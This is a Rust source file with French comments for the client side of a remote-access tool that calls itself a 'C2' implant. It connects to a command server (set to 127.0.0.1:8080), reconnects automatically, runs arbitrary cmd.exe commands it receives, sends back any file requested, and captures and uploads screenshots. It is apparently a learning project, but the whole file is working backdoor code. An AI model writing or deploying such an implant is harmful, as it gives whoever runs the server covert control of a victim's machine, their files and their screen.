use tokio::net::TcpStream;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use std::error::Error;
use common::Message;
use std::process::Command;
use std::fs;
use screenshots::Screen; 
use std::time::{SystemTime, UNIX_EPOCH};
use std::io::Cursor;
use screenshots::image::ImageFormat;


// Fonction pour exécuter les commandes Windows
fn execute_cmd(cmd: &str) -> String {
    let output = Command::new("cmd").args(&["/C", cmd]).output();
    match output {
        Ok(o) => {
            let mut res = String::from_utf8_lossy(&o.stdout).to_string();
            if !o.stderr.is_empty() { res.push_str(&String::from_utf8_lossy(&o.stderr)); }
            if res.is_empty() { return "Commande exécutée (vide).".to_string(); }
            res
        },
        Err(e) => format!("Erreur système : {}", e),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let server_addr = "127.0.0.1:8080";
    println!("Tentative de connexion à {}...", server_addr);
    
    // On boucle pour réessayer la connexion si ça échoue (reconnexion automatique basique)
    loop {
        match TcpStream::connect(server_addr).await {
            Ok(stream) => {
                println!("Connecté au C2 !");
                let (read_half, mut write_half) = stream.into_split();
                let mut reader = BufReader::new(read_half);
                let mut line = String::new();

                loop {
                    line.clear();
                    let bytes = reader.read_line(&mut line).await.unwrap_or(0);
                    if bytes == 0 { break; } // Serveur déconnecté

                    let json = line.trim();
                    if let Ok(message) = serde_json::from_str::<Message>(json) {
                        match message {
                            Message::Command(raw_cmd) => {
                                let cmd = raw_cmd.trim(); // IMPORTANT : On enlève les espaces inutiles
                                println!("Ordre reçu : '{}'", cmd); // Debug pour voir ce qu'on reçoit

                                // --- LOGIQUE DE TRI ---
                                if cmd.starts_with("download ") {
                                    // ... Code download ...
                                    let filename = cmd.strip_prefix("download ").unwrap().trim();
                                    match fs::read(filename) {
                                        Ok(data) => {
                                            let msg = Message::File { name: filename.to_string(), content: data };
                                            let mut json_resp = serde_json::to_string(&msg).unwrap();
                                            json_resp.push('\n');
                                            write_half.write_all(json_resp.as_bytes()).await.unwrap();
                                        },
                                        Err(e) => {
                                            let err = Message::Error(format!("Erreur fichier: {}", e));
                                            let mut s = serde_json::to_string(&err).unwrap();
                                            s.push('\n');
                                            write_half.write_all(s.as_bytes()).await.unwrap();
                                        }
                                    }
                                } 
                                else if cmd == "screenshot" {
                                    // ... Code screenshot ...
                                    println!("Prise de screenshot en cours...");
                                    let screens = Screen::all().unwrap_or(vec![]);
                                    if screens.is_empty() {
                                        let err = Message::Error("Aucun écran détecté".to_string());
                                        let mut s = serde_json::to_string(&err).unwrap();
                                        s.push('\n');
                                        write_half.write_all(s.as_bytes()).await.unwrap();
                                    } else {
                                        let screen = screens[0];
                                         match screen.capture() {
                                        Ok(image) => {
                                            // CORRECTION ICI :
                                            // On crée un vecteur vide pour recevoir les données
                                            let mut buffer = Vec::new();
                                            // On crée un curseur pour écrire dans ce vecteur
                                            let mut cursor = Cursor::new(&mut buffer);
                                            
                                            // On demande à la lib 'image' d'écrire en format PNG dans le curseur
                                            image.write_to(&mut cursor, ImageFormat::Png).unwrap();
                                            
                                            // Le reste est identique
                                            let start = SystemTime::now();
                                            let since_the_epoch = start.duration_since(UNIX_EPOCH).unwrap();
                                            let filename = format!("screen_{}.png", since_the_epoch.as_secs());

                                            let msg = Message::File { name: filename, content: buffer };
                                            let mut json_resp = serde_json::to_string(&msg).unwrap();
                                            json_resp.push('\n');
                                            write_half.write_all(json_resp.as_bytes()).await.unwrap();
                                            println!("Screenshot envoyé.");
                                        },
                                        Err(e) => {
                                            // ... Gestion erreur identique
                                            let err = Message::Error(format!("Erreur capture: {}", e));
                                            let mut s = serde_json::to_string(&err).unwrap();
                                            s.push('\n');
                                            write_half.write_all(s.as_bytes()).await.unwrap();
                                        }
                                    }
                                    }
                                }
                                else {
                                    // ... Code par défaut (cmd.exe) ...
                                    println!("Commande système classique...");
                                    let output = execute_cmd(cmd);
                                    let resp = Message::Output(output);
                                    let mut s = serde_json::to_string(&resp).unwrap();
                                    s.push('\n');
                                    write_half.write_all(s.as_bytes()).await.unwrap();
                                }
                            }
                            _ => {}
                        }
                    }
                }
                println!("Déconnecté. Nouvelle tentative dans 5 secondes...");
            }
            Err(_) => {
                // Si le serveur n'est pas là, on attend
            }
        }
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    }
}